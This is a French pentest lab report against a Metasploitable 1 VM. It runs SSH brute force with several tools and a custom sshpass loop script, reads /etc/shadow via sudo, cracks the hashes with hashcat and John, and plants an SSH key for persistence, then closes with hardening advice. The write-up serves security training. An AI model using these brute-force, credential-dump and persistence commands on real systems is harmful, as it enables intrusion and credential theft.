# Rapport de Pentest - Metasploitable 1

**Cible**: 192.168.144.128 (Metasploitable 1)  **|**  
**Attaquant**: Kali Linux WSL

---

## Table des matieres

1. [Reconnaissance](#1-reconnaissance)
2. [Bruteforce SSH - Tests et Echecs](#2-bruteforce-ssh---tests-et-echecs)
3. [Connexion SSH](#3-connexion-ssh)
4. [Connexion via autre service](#4-connexion-via-autre-service-ftp)
5. [Dump des credentials](#5-dump-des-credentials-etcshadow)
6. [Persistance SSH](#6-persistance-ssh)
7. [Resume et Recommandations](#7-resume-et-recommandations)

---

## 1. Reconnaissance

### 1.1 Scan Nmap

```bash
nmap -sV -sC -p- 192.168.144.128
```

**Resultat**:
```
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.144.128
Host is up (0.00052s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.1
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Informations systeme**:
- OS: Linux metasploitable 2.6.24-16-server i686 GNU/Linux
- SSH: OpenSSH 4.7p1 (algorithmes deprecies)

---

## 2. Bruteforce SSH - Tests et Echecs

### 2.1 Tentative avec Hydra (ECHEC)

**Commande**:
```bash
hydra -L /tmp/users.txt -P /tmp/passwords.txt ssh://192.168.144.128 -t 4 -V
```

**Erreur obtenue**:
```
[ERROR] could not connect to target port 22: kex error :
no match for method kex algos: server [diffie-hellman-group-exchange-sha1,
diffie-hellman-group14-sha1,diffie-hellman-group1-sha1],
client [curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,
ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,
diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,
diffie-hellman-group14-sha256]
```

**Explication**:
Hydra utilise la bibliotheque `libssh2` qui ne supporte plus les anciens algorithmes SSH (diffie-hellman-group1-sha1, ssh-rsa) pour des raisons de securite. Metasploitable 1 utilise OpenSSH 4.7 qui ne supporte que ces anciens algorithmes.

**Source**: https://github.com/vanhauser-thc/thc-hydra/issues/881

---

### 2.2 Tentative avec Patator (ECHEC PARTIEL)

**Commande**:
```bash
patator ssh_login host=192.168.144.128 user=FILE0 password=FILE1 \
  0=/usr/share/metasploit-framework/data/wordlists/unix_users.txt \
  1=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -x ignore:mesg='Authentication failed.' \
  --threads 4 --timeout 20
```

**Sortie reelle**:
```
/usr/bin/patator:452: SyntaxWarning: invalid escape sequence '\w'
/usr/bin/patator:2674: SyntaxWarning: invalid escape sequence '\w'
/usr/bin/patator:4254: SyntaxWarning: invalid escape sequence '\d'

14:44:28 patator    INFO - Starting Patator 1.0 with python-3.13.7
14:44:28 patator    INFO - code  size    time | candidate                 |   num | mesg
14:44:28 patator    INFO - -----------------------------------------------------------------------------
14:44:45 patator    INFO - 1     53     1.733 | :trustno1                 |    29 | Authentication failed: transport shut down or saw EOF
14:44:45 patator    INFO - 1     53     1.732 | :ranger                   |    30 | Authentication failed: transport shut down or saw EOF
14:45:04 patator    INFO - 1     53     2.562 | :dallas                   |    61 | Authentication failed: transport shut down or saw EOF
14:45:04 patator    INFO - 1     53     2.562 | :yankees                  |    62 | Authentication failed: transport shut down or saw EOF
[... continues avec que des echecs ...]
14:48:31 patator    INFO - 1     53     1.979 | :penis                    |   480 | Authentication failed: transport shut down or saw EOF
```

**Probleme**:
- Patator affiche des `SyntaxWarning` dus a une incompatibilite Python 3.13
- Toutes les tentatives resultent en "transport shut down or saw EOF"
- Aucun credential trouve avec les vrais dictionnaires

---

### 2.3 Tentative avec Ncrack (ECHEC)

**Commande**:
```bash
ncrack -v --user /usr/share/metasploit-framework/data/wordlists/unix_users.txt \
  -P /tmp/rockyou500.txt ssh://192.168.144.128 -T4 -oN /tmp/ncrack_results.txt
```

**Resultat** (`/tmp/ncrack_results.txt`):
```
# Ncrack 0.7 scan initiated Fri Feb 27 14:55:27 2026 as: ncrack -v --user
/usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /tmp/rockyou500.txt
-T4 -oN /tmp/ncrack_results.txt ssh://192.168.144.128

# Ncrack done at Fri Feb 27 14:57:39 2026 -- 1 service scanned in 132.02 seconds.
Probes sent: 6271 | timed-out: 0 | prematurely-closed: 6201
```

**Analyse**:
- 6271 sondes envoyees
- 6201 connexions fermees prematurement (99%)
- **Aucun credential trouve**
- Duree: 132 secondes

---

### 2.4 Medusa (SUCCES)

**Commande (premier test avec petit dictionnaire)**:
```bash
medusa -h 192.168.144.128 -U /tmp/users.txt -P /tmp/passwords.txt -M ssh -t 4 -O /tmp/medusa_results.txt
```

**Resultat** (`/tmp/medusa_results.txt`):
```
# Medusa v.2.3 (2026-02-27 14:31:35)
# medusa -h 192.168.144.128 -U /tmp/users.txt -P /tmp/passwords.txt -M ssh -t 4 -O /tmp/medusa_results.txt
2026-02-27 14:31:41 ACCOUNT FOUND: [ssh] Host: 192.168.144.128 User: msfadmin Password: msfadmin [SUCCESS]
2026-02-27 14:31:46 ACCOUNT FOUND: [ssh] Host: 192.168.144.128 User: user Password: user [SUCCESS]
2026-02-27 14:32:07 ACCOUNT FOUND: [ssh] Host: 192.168.144.128 User: service Password: service [SUCCESS]
```

**Commande (deuxieme test avec vrais dictionnaires)**:
```bash
medusa -h 192.168.144.128 \
  -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt \
  -P /tmp/rockyou500.txt \
  -M ssh -t 4 -O /tmp/medusa_results.txt
```

**Resultat**:
```
# Medusa v.2.3 (2026-02-27 14:50:07)
# medusa -h 192.168.144.128 -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt
  -P /tmp/rockyou500.txt -M ssh -t 4 -O /tmp/medusa_results.txt
# Medusa has finished (2026-02-27 14:56:23).
```

**Note**: Le deuxieme test avec les vrais dictionnaires n'a pas trouve de nouveaux credentials car les mots de passe triviaux (user=password) ne sont pas dans RockYou.

---

### 2.5 Script sshpass personnalise (SUCCES)

Pour contourner les limitations des outils, un script bash utilisant `sshpass` a ete cree:

**Script** (`/tmp/ssh_bruteforce.sh`):
```bash
#!/bin/bash
TARGET="192.168.144.128"
USERS="/tmp/users.txt"
PASSWORDS="/tmp/passwords.txt"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=10"

echo "[*] Starting SSH bruteforce on $TARGET"

while IFS= read -r user; do
    while IFS= read -r pass; do
        if sshpass -p "$pass" ssh $SSH_OPTS "$user@$TARGET" "exit" 2>/dev/null; then
            echo "[SUCCESS] $user:$pass"
            echo "$user:$pass" >> /tmp/found_creds.txt
        fi
    done < "$PASSWORDS"
done < "$USERS"
```

**Resultat** (`/tmp/found_creds.txt`):
```
msfadmin:msfadmin
user:user
service:service
postgres:postgres
```

---

### 2.6 Dictionnaires utilises

| Fichier | Contenu | Lignes |
|---------|---------|--------|
| `/usr/share/metasploit-framework/data/wordlists/unix_users.txt` | Utilisateurs Unix courants | 175 |
| `/tmp/rockyou500.txt` | Top 500 RockYou | 500 |
| `/usr/share/wordlists/rockyou.txt` | RockYou complet | 14,344,391 |
| `/tmp/users.txt` | Liste ciblee (msfadmin, user, etc.) | 10 |
| `/tmp/passwords.txt` | Liste ciblee (msfadmin, user, etc.) | 10 |

**Creation du dictionnaire RockYou 500**:
```bash
head -500 /usr/share/wordlists/rockyou.txt > /tmp/rockyou500.txt
```

---

### 2.7 Tableau comparatif des outils

| Outil | Resultat | Credentials | Probleme |
|-------|----------|-------------|----------|
| Hydra | ECHEC | 0 | libssh2 incompatible avec anciens algos SSH |
| Patator | ECHEC | 0 | "transport shut down", warnings Python 3.13 |
| Ncrack | ECHEC | 0 | 99% connexions fermees prematurement |
| Medusa | SUCCES | 3 | Fonctionne avec les anciens algos |
| sshpass | SUCCES | 4 | Script manuel mais fiable |

---

## 3. Connexion SSH

### 3.1 Configuration SSH pour algorithmes legacy

Le fichier `~/.ssh/config` a ete modifie pour permettre la connexion:

```bash
# ~/.ssh/config
Host 192.168.144.128
    HostKeyAlgorithms ssh-rsa
    PubkeyAcceptedAlgorithms ssh-rsa
    KexAlgorithms diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
    Ciphers aes128-cbc,aes256-cbc,3des-cbc
```

### 3.2 Test de connexion

**Commande**:
```bash
sshpass -p "msfadmin" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  msfadmin@192.168.144.128 "uname -a; whoami; id"
```

**Resultat**:
```
Warning: Permanently added '192.168.144.128' (RSA) to the list of known hosts.
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
msfadmin
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),
29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),
119(sambashare),1000(msfadmin)
```

**Observation importante**: L'utilisateur `msfadmin` est membre du groupe `admin` (gid 112), ce qui lui permet d'utiliser `sudo`.

---

## 4. Connexion via autre service (FTP)

### 4.1 Test FTP

**Commande**:
```bash
echo -e "USER msfadmin\nPASS msfadmin\nPWD\nQUIT" | nc 192.168.144.128 21
```

**Resultat**:
```
220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.144.128]
331 Password required for msfadmin
230 User msfadmin logged in
257 "/" is the current directory
221 Goodbye.
```

**Service**: ProFTPD 1.3.1 - connexion reussie avec les memes credentials que SSH.

### 4.2 Test Telnet (ECHEC)

**Commande**:
```bash
telnet 192.168.144.128
```

**Resultat**:
```
Trying 192.168.144.128...
Connected to 192.168.144.128.
Escape character is '^]'.
Connection closed by foreign host.
```

La connexion Telnet se ferme immediatement - service possiblement mal configure.

---

## 5. Dump des credentials (/etc/shadow)

### 5.1 Commande utilisee

```bash
sshpass -p "msfadmin" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  msfadmin@192.168.144.128 "echo 'msfadmin' | sudo -S cat /etc/shadow 2>/dev/null"
```

### 5.2 Resultat complet

```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
```

### 5.3 Hash extraits (comptes avec mot de passe)

| Utilisateur | Hash MD5 ($1$) |
|-------------|----------------|
| root | `$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.` |
| sys | `$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0` |
| klog | `$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0` |
| msfadmin | `$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/` |
| postgres | `$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/` |
| user | `$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0` |
| service | `$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//` |

**Format du hash**: MD5 (identifie par le prefixe `$1$`)

### 5.4 Cracking des hash avec Hashcat

**Preparation du fichier**:
```bash
cat > /tmp/hashes_hashcat.txt << 'EOF'
$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0
$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/
$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//
EOF
```

**Commande Hashcat** (mode 500 = md5crypt):
```bash
hashcat -m 500 -a 0 /tmp/hashes_hashcat.txt /tmp/custom_crack.txt --force
```

**Sortie Hashcat**:
```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, LLVM 18.1.8) - Platform #1 [The pocl project]
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-10850K CPU @ 3.60GHz, 6921/13907 MB

Hashes: 7 digests; 7 unique digests, 7 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes

$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:msfadmin
$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:postgres
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:batman
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:service
$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:user

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Time.Started.....: Fri Feb 27 15:21:57 2026, (1 sec)
Speed.#1.........:      385 H/s (0.45ms) @ Accel:32 Loops:1000 Thr:1 Vec:8
Recovered........: 5/7 (71.43%) Digests

Started: Fri Feb 27 15:21:42 2026
Stopped: Fri Feb 27 15:21:59 2026
```

### 5.5 Cracking avec John the Ripper

**Commande**:
```bash
cat > /tmp/all_hashes.txt << 'EOF'
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//
EOF

john --wordlist=/tmp/custom_wordlist.txt /tmp/all_hashes.txt
```

**Sortie John the Ripper**:
```
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 20 OpenMP threads
user             (user)
postgres         (postgres)
msfadmin         (msfadmin)
batman           (sys)
service          (service)
5g 0:00:00:00 DONE (2026-02-27 15:19) 100.0g/s 260.0p/s 1820c/s 1820C/s root..toor
Session completed.
```

**Verification des hash craques**:
```bash
$ john --show /tmp/all_hashes.txt
sys:batman
msfadmin:msfadmin
postgres:postgres
user:user
service:service

5 password hashes cracked, 2 left
```

### 5.6 Resultats du cracking

| Utilisateur | Hash | Mot de passe | Craque |
|-------------|------|--------------|--------|
| root | `$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.` | ??? | NON |
| sys | `$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0` | **batman** | OUI |
| klog | `$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0` | ??? | NON |
| msfadmin | `$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/` | msfadmin | OUI |
| postgres | `$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/` | postgres | OUI |
| user | `$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0` | user | OUI |
| service | `$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//` | service | OUI |

**Taux de reussite**: 5/7 (71.43%)

**Observation**: Le mot de passe de root n'est pas dans RockYou ni dans les wordlists communes. Il faudrait utiliser une attaque par bruteforce incremental ou des regles de mutation.

---

## 6. Persistance SSH

### 6.1 Generation de la cle

**Commande**:
```bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa_persistence -N "" -C "persistence@kali"
```

**Resultat**:
```
Generating public/private rsa key pair.
Your identification has been saved in /home/nyx/.ssh/id_rsa_persistence
Your public key has been saved in /home/nyx/.ssh/id_rsa_persistence.pub
The key fingerprint is:
SHA256:x5zTHGS67kFWW880DBnubgPrq+4foR5eR6u2xysF3w0 persistence@kali
```

**Cle publique generee**:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCssso1e2x7OkzgzrZhZ0GOTSSKKm8FjoAxalVAtunAK6xObBXY5XznQCC5xMO35hBhUDuUtWLjYBJVsKeGD0DpYsMvVNHi18wAU/5qEUfgQ/Xl8eRGT9s5qKyT3HsCel1+Ufk2pmdadBWNANOQCThywIHoEKoDccyyfiwKnLtaJanyhamdgrY9pYKCrheyy33EwyQisKBURIjsxpMhHMcGeGrlaNbppJN+WP62+i7WH9blOi4k3i5CFzOXo769guzaxja7we5LJAJKqjt469eUaJ/MsZrRfjNz/5wXo0HCXDOyvnVYnXdv0UemPRcydYb5n0+lvvqiyywkY800t7L5 persistence@kali
```

### 6.2 Injection de la cle sur la cible

**Commande**:
```bash
PUBKEY=$(cat ~/.ssh/id_rsa_persistence.pub)
sshpass -p "msfadmin" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  msfadmin@192.168.144.128 "
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo '$PUBKEY' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo '[+] Cle ajoutee avec succes'
cat ~/.ssh/authorized_keys
"
```

**Resultat**:
```
[+] Cle ajoutee avec succes
ssh-dss AAAAB3NzaC1kc3MAAACBANWgcbHvxF2YRX0gTizyoZazzHiU5+63hKFOhzJch8dZQpFU5gGkDkZ30rC4jrNqCXNDN50RA4ylcNtO78B/I4+5YCZ39faSiXIoLfi8tOVWtTtg3lkuv3eSV0zuSGeqZPHMtep6iizQA5yoClkCyj8swXH+cPBG5uRPiXYL911rAAAAFQDL+pKrLy6vy9HCywXWZ/jcPpPHEQAAAIAgt+cN3fDT1RRCYz/VmqfUsqW4jtZ06kvx3L82T2Z1YVeXe7929JWeu9d3OB+NeE8EopMiWaTZT0WI+OkzxSAGyuTskue4nvGCfxnDr58xa1pZcSO66R5jCSARMHU6WBWId3MYzsJNZqTN4uoRa4tIFwM8X99K0UUVmLvNbPByEAAAAIBNfKRDwM/QnEpdRTTsRBh9rALq6eDbLNbu/5gozf4Fv1Dt1Zmq5ZxtXeQtW5BYyorILRZ5/Y4pChRa01bxTRSJah0RJk5wxAUPZ282N07fzcJyVlBojMvPlbAplpSiecCuLGX7G04Ie8SFzT+wCketP9Vrw0PvtUZU3DfrVTCytg== user@metasploitable
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCssso1e2x7OkzgzrZhZ0GOTSSKKm8FjoAxalVAtunAK6xObBXY5XznQCC5xMO35hBhUDuUtWLjYBJVsKeGD0DpYsMvVNHi18wAU/5qEUfgQ/Xl8eRGT9s5qKyT3HsCel1+Ufk2pmdadBWNANOQCThywIHoEKoDccyyfiwKnLtaJanyhamdgrY9pYKCrheyy33EwyQisKBURIjsxpMhHMcGeGrlaNbppJN+WP62+i7WH9blOi4k3i5CFzOXo769guzaxja7we5LJAJKqjt469eUaJ/MsZrRfjNz/5wXo0HCXDOyvnVYnXdv0UemPRcydYb5n0+lvvqiyywkY800t7L5 persistence@kali
```

**Note**: Une cle existante (`user@metasploitable`) etait deja presente.

### 6.3 Verification de la persistance

**Commande**:
```bash
ssh -i ~/.ssh/id_rsa_persistence -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  msfadmin@192.168.144.128 "echo '[+] Connexion SSH par cle reussie !'; whoami; hostname"
```

**Resultat**:
```
[+] Connexion SSH par cle reussie !
msfadmin
metasploitable
```

**La persistance est fonctionnelle** - acces sans mot de passe.

---

## 7. Resume et Recommandations

### 7.1 Credentials trouves

| Utilisateur | Mot de passe | Service | Methode |
|-------------|--------------|---------|---------|
| msfadmin | msfadmin | SSH/FTP | Medusa + sshpass |
| user | user | SSH | Medusa + sshpass |
| service | service | SSH | Medusa + sshpass |
| postgres | postgres | SSH | sshpass |

### 7.2 Vulnerabilites identifiees

| Vulnerabilite | Severite | Impact |
|---------------|----------|--------|
| Mots de passe triviaux (user=password) | CRITIQUE | Acces complet au systeme |
| SSH avec algorithmes deprecies | HAUTE | Permet bruteforce avec outils legacy |
| msfadmin dans groupe admin | HAUTE | Acces sudo sans restriction |
| Pas de fail2ban | MOYENNE | Aucune protection contre bruteforce |
| FTP avec meme credentials | MOYENNE | Surface d'attaque elargie |
| Hash MD5 dans /etc/shadow | MOYENNE | Facilement crackable |

### 7.3 Recommandations

1. **Changer tous les mots de passe** avec politique forte (12+ caracteres, complexite)
2. **Mettre a jour OpenSSH** vers une version recente
3. **Desactiver les algorithmes SSH deprecies** dans `/etc/ssh/sshd_config`:
   ```
   KexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256
   Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
   MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
   ```
4. **Installer fail2ban** pour bloquer les tentatives de bruteforce
5. **Restreindre sudo** - retirer msfadmin du groupe admin
6. **Auditer les cles SSH** dans tous les `~/.ssh/authorized_keys`
7. **Migrer vers SHA-512** pour les hash de mots de passe

### 7.4 Fichiers generes

| Fichier | Description |
|---------|-------------|
| `/tmp/medusa_results.txt` | Resultats bruteforce Medusa |
| `/tmp/ncrack_results.txt` | Resultats Ncrack (echec) |
| `/tmp/patator_real_dico.txt` | Resultats Patator (echec) |
| `/tmp/shadow_dump.txt` | Hash shadow extraits |
| `/tmp/found_creds.txt` | Credentials valides |
| `/tmp/rockyou500.txt` | Top 500 RockYou |
| `~/.ssh/id_rsa_persistence` | Cle privee persistance |
| `~/.ssh/id_rsa_persistence.pub` | Cle publique persistance |

---

## Sources et References

- Hydra SSH issues: https://github.com/vanhauser-thc/thc-hydra/issues/881
- Patator: https://github.com/lanjelot/patator
- Medusa: http://foofus.net/goons/jmk/medusa/medusa.html
- Ncrack: https://nmap.org/ncrack/
- RockYou wordlist: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
- OpenSSH legacy algorithms: https://www.openssh.com/legacy.html

